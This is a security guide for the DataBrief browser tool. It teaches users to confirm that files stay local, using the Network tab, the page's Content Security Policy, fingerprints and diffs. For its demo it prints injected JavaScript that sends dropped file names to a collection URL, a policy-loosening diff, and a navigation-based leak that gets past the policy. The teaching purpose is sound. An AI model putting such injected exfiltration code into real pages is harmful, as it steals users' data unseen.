# Check it yourself: is your data really staying in your browser?

DataBrief says your files never leave your computer. This guide shows you **how to check that claim yourself**, in a
few minutes, with tools every browser already has. Then it shows you **what cheating looks like**, using a
deliberately tampered copy of DataBrief, so you know exactly what to look for.

You'll learn a habit that works for any website: **check before you trust.**

**Contents**

1. [Why your data stays private](#1-why-your-data-stays-private)
2. [The threat: a modified page](#2-the-threat-a-modified-page)
3. [Hands-on 1: the real page sends nothing](#3-hands-on-1-the-real-page-sends-nothing)
4. [Hands-on 2: catch a tampered page in the act](#4-hands-on-2-catch-a-tampered-page-in-the-act)
5. [Hands-on 3: watch the security policy block it](#5-hands-on-3-watch-the-security-policy-block-it)
6. [Hands-on 4: what the policy cannot block](#6-hands-on-4-what-the-policy-cannot-block)
7. [Spot tampering without running anything](#7-spot-tampering-without-running-anything)
8. [Limits and good habits](#8-limits-and-good-habits)

[← Back to the README](../README.md) · [Learning path](learn.md)

---

## 1. Why your data stays private

Two things protect your data.

**Everything happens in the browser.** When you drop a file on DataBrief, the page's own JavaScript reads it and builds
the prompt, right there in your browser tab. There is no "upload" step and no server doing the work. The server (or
GitHub Pages, Cloudflare, an ESP32…) only delivers the page, once. After that, it's out of the picture.

**The page forbids itself from loading or sending anything.** The page starts with a *Content Security Policy* (CSP), a
set of rules the browser enforces on the page:

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; ... connect-src 'none'; ...">
```

`connect-src 'none'` means **"this page may not make any request"**: no `fetch`, no `XMLHttpRequest`, no WebSocket, no
beacon. Even if some code inside the page *tried* to send your data somewhere that way, the browser would refuse.
The other rules forbid loading external scripts, images, fonts or frames.

> **What a policy cannot do:** forbid the page from *navigating*, that is, sending your browser tab to another address.
> A request is blocked; a navigation is not. [Section 6](#6-hands-on-4-what-the-policy-cannot-block) shows it live,
> and why it does not weaken the checks below: a navigation is visible.

So wherever DataBrief is hosted (your computer, GitHub or GitLab Pages, Cloudflare, your own server, a Raspberry Pi,
an ESP32), **an unmodified page keeps your data private.**

## 2. The threat: a modified page

The key word above is *unmodified*. Whoever controls the place the page comes from could, in theory, change it before
it reaches you. That could be a hosting company, someone who broke into a server, a company proxy, or a malicious
copy someone emailed you. A modified page could:

1. **remove or loosen the security policy**, so network requests are allowed again, and
2. **add code** that quietly sends something (your file's name, or worse, its content) to a server.

This isn't specific to DataBrief: it's true of every website you use. The difference is that DataBrief is small,
open source and makes no requests at all, so **cheating is easy to spot**. The next sections show you how.

## 3. Hands-on 1: the real page sends nothing

You'll use your browser's **developer tools**, specifically the **Network** tab, which lists every request a page
makes.

1. Open DataBrief: the [online version](https://arfo-du-blo.github.io/DataBrief/), or `databrief.html` on your computer.
2. Press **F12** (Mac: **Cmd+Option+I**) to open the developer tools, and click the **Network** tab.
3. Click the 🚫 button (Clear) to empty the list, so you only see what happens from now on.
4. Drop any data file on the page and wait for the prompt. Click **Copy**, try **Download .md**, switch modes…
5. Look at the Network tab.

**What you should see: nothing.** No new line appears. Your file was read and converted without a single byte going
anywhere. (Downloads you trigger may show up as `blob:` or `data:` entries: those are created *inside* the browser
and never leave your computer.)

> 💡 Tip: tick **Preserve log** in the Network tab to keep the list when the page reloads.

## 4. Hands-on 2: catch a tampered page in the act

Now let's see what a cheating page looks like. The repository contains a **deliberately tampered copy** of DataBrief
and a tiny "attacker's server" to receive what it sends. Everything runs on your own computer: nothing leaves it.

**What's in [`examples/tampered/`](../examples/tampered/)**

| File | What it is |
|---|---|
| `corrupted_databrief.html` | DataBrief with injected code that sends the **name** of the file you open (never its content), and a loosened security policy so the request can leave |
| `corrupted_databrief_blocked.html` | The same injected code, but the security policy left untouched (for [section 5](#5-hands-on-3-watch-the-security-policy-block-it)) |
| `corrupted_databrief_navigation.html` | Policy untouched, but the injected code **navigates** the tab instead of making a request (for [section 6](#6-hands-on-4-what-the-policy-cannot-block)) |
| `injected_code.js`, `injected_navigation.js` | The injected code on its own, to read |
| `receiver.py` | The "attacker's server": serves both pages and prints whatever they send |

All three pages carry a big red **"DEMO: deliberately TAMPERED copy"** banner, so nobody uses them by mistake. They're
never published: GitHub/GitLab Pages, the releases and the Docker images only contain the real files.

### The injected code

This is what the "attacker" added at the end of the page (from [`injected_code.js`](../examples/tampered/injected_code.js)):

```js
(function () {
  var COLLECT_URL = 'http://127.0.0.1:8765/collect';

  function leak(file) {
    if (!file) return;
    // A quiet background request: the page keeps working normally, the user notices nothing.
    fetch(COLLECT_URL + '?name=' + encodeURIComponent(file.name), { mode: 'no-cors' }).catch(function () {});
  }

  // Listen *before* DataBrief does (capture phase), for both ways of opening a file.
  document.addEventListener('change', function (e) {
    if (e.target && e.target.files) leak(e.target.files[0]);
  }, true);
  window.addEventListener('drop', function (e) {
    if (e.dataTransfer && e.dataTransfer.files) leak(e.dataTransfer.files[0]);
  }, true);
})();
```

Line by line:

- `COLLECT_URL`: where the stolen information goes. Here it's `127.0.0.1`, which always means *"this computer"*, so
  it ends up in the demo receiver on your own machine. A real attacker would put their own server here.
- `leak(file)`: builds a URL such as `http://127.0.0.1:8765/collect?name=sales_2026.xlsx` and requests it with
  `fetch`. `encodeURIComponent` makes the name safe to put in a URL. `mode: 'no-cors'` and `.catch(...)` make the
  request fire-and-forget: no error, no visible effect.
- The two `addEventListener(..., true)` calls watch for a file being chosen (`change`) or dropped (`drop`). The
  final `true` means *capture phase*: the injected code sees the file **before** DataBrief does.
- DataBrief itself keeps working exactly as usual. That's the point: **you can't tell from looking at the page.**

The second change is in the security policy at the top of the page:

```diff
- connect-src 'none'
+ connect-src http://127.0.0.1:8765
```

Without that change, the browser would block the request (see [section 5](#5-hands-on-3-watch-the-security-policy-block-it)).
**An attacker has to remove the protection first**, and that change is visible too ([section 7](#7-spot-tampering-without-running-anything)).

### The receiver

[`receiver.py`](../examples/tampered/receiver.py) is about 75 lines of standard Python. It listens on `127.0.0.1:8765`
only, so no other computer can reach it, and does two things:

- `GET /` and `GET /blocked` return the two tampered pages;
- `GET /collect?name=...` prints the name it receives:

```python
if url.path == "/collect":
    name = urllib.parse.parse_qs(url.query).get("name", ["?"])[0]
    print("\n  >>> RECEIVED from the browser: file name = %r\n" % name, flush=True)
```

### Try it

You need Python 3.8 or newer (`python3 --version`; on Windows, `py --version`).

1. **Start the receiver** in a terminal, from the repository folder:
   ```bash
   python3 examples/tampered/receiver.py        # Windows: py examples\tampered\receiver.py
   ```
   ```
   DEMO receiver (the 'attacker'), listening on http://127.0.0.1:8765 only
     Tampered page that leaks file names:  http://127.0.0.1:8765/
     Same code, blocked by the policy:     http://127.0.0.1:8765/blocked
   ```
2. **Open** <http://127.0.0.1:8765/> in your browser. You'll see DataBrief with the red demo banner.
3. Press **F12**, open the **Network** tab and clear it (🚫).
4. **Drop a data file** on the page, for example `sales_2026.xlsx`. The prompt appears as usual.
5. **Look at the Network tab:** a new line appears, named `collect?name=sales_2026.xlsx`.
   Click it: the **Headers** panel shows the full address, and the **Payload** panel shows `name: sales_2026.xlsx`.
   **That's what a leak looks like.**
6. **Look at the receiver's terminal:**
   ```
     >>> RECEIVED from the browser: file name = 'sales_2026.xlsx'
   ```
   The "attacker" got your file name, while the page looked perfectly normal.

> You can also double-click `corrupted_databrief.html` to open it as a file: the leak works the same way.
> Recent browsers may first ask for permission to **access devices on your local network**. That prompt is itself
> a warning sign worth knowing: a page that only converts files has no reason to ask.

Here the code only sends the file **name**, to keep the demo harmless. Exactly the same technique could send the
file's **content**, and that request would show up in the Network tab in exactly the same way. That's why the
Network tab is such a good test: **whatever a page sends, it has to go through there.**

Stop the receiver with **Ctrl+C** when you're done.

## 5. Hands-on 3: watch the security policy block it

What if an attacker injected the code but **left the security policy alone**? The second page answers that.

1. With the receiver still running, open <http://127.0.0.1:8765/blocked>.
2. Open the developer tools, this time on the **Console** tab.
3. Drop a data file.

**What you see:**

- In the **Console**, a red error such as:
  ```
  Refused to connect to 'http://127.0.0.1:8765/collect?name=sales_2026.xlsx' because it violates the following
  Content Security Policy directive: "connect-src 'none'".
  ```
- In the **Network** tab, either nothing, or a line marked **(blocked:csp)**, depending on the browser.
- In the **receiver's terminal: nothing.** The request never left the browser.

This is DataBrief's second line of defence at work: even code that *wants* to send data out can't, as long as the
policy is in place. To cheat, an attacker has to change the policy too, and that is exactly what you can check.

## 6. Hands-on 4: what the policy cannot block

A Content Security Policy governs what a page can **load and request**. It does **not** govern where the page can
**send the tab**. So a tampered page can keep DataBrief's policy fully intact and still leak a file name, by
navigating to an address that carries it.

The repository contains a third tampered page for this: `corrupted_databrief_navigation.html`, with the security policy
**untouched**. With the receiver running (see [section 4](#try-it)):

1. Open <http://127.0.0.1:8765/navigation>, then press **F12** and the **Network** tab, and tick **Preserve log**.
2. Drop any data file.
3. **What happens:** the page disappears and the tab shows "The page navigated away", with your file name in the
   address: `http://127.0.0.1:8765/navigated?name=sales_2026.xlsx`. The receiver's terminal prints
   `RECEIVED by navigation: file name = 'sales_2026.xlsx'`. The Console reports **no** policy violation: the policy did
   not stop it.
4. **How you would see it in real life:** the Network tab lists a request of type **document**, the address bar
   changes, and the page you were using is gone. A real attacker would send you straight back to hide it, but you
   would still see the extra document request in the log.

The injected code is [`injected_navigation.js`](../examples/tampered/injected_navigation.js), a few lines using
`window.location.assign(...)`.

**What this changes for you:**
- The README says the policy "stops the page from loading or sending anything (requests, scripts, images, frames…)",
  not "from any network connection": navigation is the exception, and a modified page could use it.
- It does not weaken the checks in this guide. The **Network tab** shows navigations as well as requests, the
  **fingerprint** (section 7) shows that the file was modified, and the **diff** shows the code.
- For an unmodified page, none of this applies: the official `databrief.html` contains no code that navigates anywhere
  (its only link is the "Powered by" link in the footer, which does nothing until you click it).

## 7. Spot tampering without running anything

The Network tab catches a page **while it runs**. These two checks catch it **before you even open it**.

### Compare the fingerprint (SHA-256)

A SHA-256 *fingerprint* (or *hash*) is a 64-character code computed from a file's exact content. Change one single
character and the fingerprint is completely different. Each [release](https://github.com/Arfo-du-blo/DataBrief/releases/latest)
publishes the fingerprints of its files in `SHA256SUMS.txt`.

1. Download `databrief.html` and `SHA256SUMS.txt` from the same release.
2. Compute the fingerprint of your file:
   ```powershell
   Get-FileHash databrief.html                 # Windows (PowerShell)
   ```
   ```bash
   sha256sum databrief.html                    # Linux
   shasum -a 256 databrief.html                # macOS
   ```
3. Compare with the line for `databrief.html` in `SHA256SUMS.txt`. **Identical = the exact official file.**

Try it on the demo: `corrupted_databrief.html` has a completely different fingerprint from `databrief.html`, even
though the two pages look the same in the browser.

> Built from the same sources, `databrief.html` always comes out byte-for-byte identical, on Windows or Linux. So the
> `databrief.html` in the repository matches the release too.
>
> The same goes for the [command-line tool](cli.md): `databrief-cli.cjs` is in `SHA256SUMS.txt`, and `node tools/build-cli.cjs`
> from the sources writes the same bytes on every system. Check it with `sha256sum -c SHA256SUMS.txt`.
>
> A team version made with the settings page contains your team's settings, so its fingerprint is different. That's
> expected. Record its fingerprint when you make it, and compare against that.

### See exactly what changed

Since DataBrief is open source, you can compare any copy with the original and see every difference. With Git
installed:

```bash
git diff --no-index --stat databrief.html examples/tampered/corrupted_databrief.html
git diff --no-index databrief.html examples/tampered/corrupted_databrief.html | head -80
```

The output shows the changed title, the loosened `connect-src` rule, the banner, and the injected `<script>`, line
by line. Any text-comparison tool (VS Code's *Compare Selected*, WinMerge, Meld…) works too.

## 8. Limits and good habits

**Be honest about what the Network tab proves.** It shows what a page does **during your session**. A cleverly
modified page could behave differently some other time: only on certain days, only for certain files, only after a
delay. Watching the Network tab is a great check, but it isn't a guarantee.

**The strongest guarantee is an unmodified file:**

- use the official release and **check its fingerprint**, or
- keep **your own copy** and open it locally (double-click). No server is involved at all, and you know the file
  hasn't changed since you checked it.

**Other good habits:**

- If you host DataBrief behind **Cloudflare**, turn off the features that rewrite pages (Rocket Loader, automatic
  minification, analytics injection) for the DataBrief address. They don't steal data, but they modify the page,
  which DataBrief's policy blocks and which breaks the fingerprint check.
  See [Expose it outside your network](../README.md#expose-it-outside-your-network-cloudflare-tunnel).
- **Be suspicious of copies you didn't make**, such as a `databrief.html` received by email or an unexpected "team version".
  Check where it came from, and its fingerprint.
- **Watch for permission prompts.** A file converter has no reason to ask for network, camera or location access.

**In one sentence:** wherever it's hosted, DataBrief carries the page, never your data, and now you know how to
check that for yourself.

[← Back to the README](../README.md) · [Learning path](learn.md)
